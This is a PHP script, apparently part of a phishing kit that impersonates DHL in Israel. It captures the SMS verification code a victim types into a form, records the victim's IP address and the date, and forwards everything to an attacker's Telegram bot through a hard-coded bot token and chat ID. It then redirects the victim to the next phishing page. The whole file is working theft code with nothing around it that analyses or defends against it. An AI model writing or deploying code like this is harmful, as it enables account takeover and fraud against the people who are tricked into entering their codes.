<?php



$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");


if(($_POST['msg'] != ""))
	
	{	

$message .= "______________DHL sms Israel________________\n";
$message .= "* SMS CODE : ".$_POST['msg']."\n";

$message .= "* IP   : $ip\n";
$message .= "* date   : $date\n";
$message .= "______________________________\n";



file_get_contents("https://api.telegram.org/bot1926008185:AAFUpqcX-CMsK8RdswTRgL_75MoUJA8wEFM/sendMessage?chat_id=1855902839&text=" . urlencode($message)."" );

        header("Location: ../xsmsz2.php");
} else


header("Location: ../xsmsz.php");




?>